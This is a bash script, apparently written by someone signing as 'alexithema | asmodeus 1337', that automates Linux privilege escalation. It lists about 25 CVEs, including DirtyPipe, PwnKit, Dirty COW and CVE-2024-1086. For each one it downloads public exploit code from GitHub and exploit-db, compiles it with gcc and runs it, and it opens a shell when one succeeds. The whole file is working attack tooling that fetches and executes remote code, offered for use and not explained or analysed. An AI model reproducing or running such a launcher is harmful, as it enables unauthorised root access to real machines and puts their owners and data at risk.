#!/bin/bash

set -euo pipefail
IFS=$'\n\t'

# Constants
KERNEL_VERSION=$(uname -r)
OS_INFO=$(grep -w "PRETTY_NAME" /etc/os-release | cut -d= -f2 | tr -d '"')
ARCH=$(uname -m)
LOG_FILE="/tmp/exploit_log_$(date +%F_%H-%M-%S).txt"
TEMP_DIR="/tmp/exploit_temp_$$"
declare -A EXPLOIT_LIST=(
    ["CVE-2022-0847"]="https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/dirtypipez.c"
    ["CVE-2021-4034"]="https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c"
    ["CVE-2016-5195"]="https://www.exploit-db.com/download/40839"
    ["CVE-2017-16995"]="https://www.exploit-db.com/download/44298"
    ["CVE-2023-3269"]="https://raw.githubusercontent.com/lrh2000/StackRot/main/stackrot.c"
    ["CVE-2024-1086"]="https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c"
    ["CVE-2016-0728"]="https://www.exploit-db.com/download/40003"
    ["CVE-2019-13272"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c"
    ["CVE-2018-1000001"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-1000001/poc.c"
    ["CVE-2019-3842"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-3842/poc.c"
    ["CVE-2021-3493"]="https://www.exploit-db.com/download/50860"
    ["CVE-2020-14386"]="https://www.exploit-db.com/download/49432"
    ["CVE-2021-3156"]="https://www.exploit-db.com/download/50245"
    ["CVE-2020-0601"]="https://www.exploit-db.com/download/49040"
    ["CVE-2020-10189"]="https://www.exploit-db.com/download/49593"
    ["CVE-2021-22947"]="https://www.exploit-db.com/download/50579"
    ["CVE-2022-0185"]="https://www.exploit-db.com/download/51025"
    ["CVE-2022-25636"]="https://www.exploit-db.com/download/51164"
    ["CVE-2022-22963"]="https://www.exploit-db.com/download/51175"
    ["CVE-2023-21716"]="https://www.exploit-db.com/download/51545"
    ["CVE-2019-14287"]="https://www.exploit-db.com/download/46655"
    ["CVE-2019-15666"]="https://www.exploit-db.com/download/47452"
    ["CVE-2021-40444"]="https://www.exploit-db.com/download/50048"
    ["CVE-2018-14634"]="https://www.exploit-db.com/download/45528"
    ["CVE-2022-27291"]="https://www.exploit-db.com/download/51341"
)

# Check for required dependencies
check_dependencies() {
    local dependencies=("wget" "gcc" "curl")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            log_message "Error: $dep is required but not installed."
            exit 1
        fi
    done
}

# Log message with timestamp
log_message() {
    local message="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" | tee -a "$LOG_FILE"
}

# Clean up temporary files
cleanup() {
    log_message "Cleaning up temporary files..."
    rm -rf "$TEMP_DIR"
}

# Check if URL is accessible
check_url() {
    local url="$1"
    if curl --output /dev/null --silent --head --fail --max-time 10 "$url"; then
        return 0
    else
        return 1
    fi
}

# Execute exploit for a given CVE
execute_exploit() {
    local cve="$1"
    local url="$2"
    local extension="${url##*.}"
    local temp_file="$TEMP_DIR/${cve}.${extension}"
    local output_file="$TEMP_DIR/${cve}_exploit"

    log_message "Trying $cve..."

    # Verify URL accessibility
    if ! check_url "$url"; then
        log_message "Failed to access $cve URL: $url"
        return 1
    fi

    # Download exploit file
    if ! wget -q --timeout=15 --tries=2 "$url" -O "$temp_file" 2>>"$LOG_FILE"; then
        log_message "Failed to download $cve from $url"
        return 1
    fi

    case "$extension" in
        c)
            # Compile C exploit
            if ! gcc -Wall -Werror -o "$output_file" "$temp_file" 2>>"$LOG_FILE"; then
                log_message "Failed to compile $cve"
                return 1
            fi

            chmod +x "$output_file"
            log_message "Executing compiled exploit for $cve..."
            if timeout -k 10 30 "$output_file" 2>>"$LOG_FILE"; then
                log_message "$cve exploit succeeded"
                /bin/bash
                exit 0
            else
                log_message "$cve exploit failed"
                return 1
            fi
            ;;
        sh|bash)
            # Execute shell scripts directly
            chmod +x "$temp_file"
            log_message "Executing shell script exploit for $cve..."
            if timeout -k 10 30 "$temp_file" 2>>"$LOG_FILE"; then
                log_message "$cve exploit succeeded"
                /bin/bash
                exit 0
            else
                log_message "$cve exploit failed"
                return 1
            fi
            ;;
        *)
            log_message "Unsupported file extension for $cve: $extension"
            return 1
            ;;
    esac
}

# Main function
main() {
    # Check write permissions for log file
    touch "$LOG_FILE" || {
        echo "Error: Cannot write to log file $LOG_FILE" >&2
        exit 1
    }

    # Create temporary directory
    mkdir -p "$TEMP_DIR" || {
        log_message "Error: Failed to create temporary directory $TEMP_DIR"
        exit 1
    }

    log_message "System Info: OS=$OS_INFO, Kernel=$KERNEL_VERSION, Arch=$ARCH"
    log_message "Created by alexithema | asmodeus 1337"

    check_dependencies

    trap cleanup EXIT

    local success=0
    for cve in "${!EXPLOIT_LIST[@]}"; do
        execute_exploit "$cve" "${EXPLOIT_LIST[$cve]}" && success=1
    done

    if [ $success -eq 0 ]; then
        log_message "All exploits failed"
    else
        log_message "Exploit process completed with at least one success"
    fi
}

main
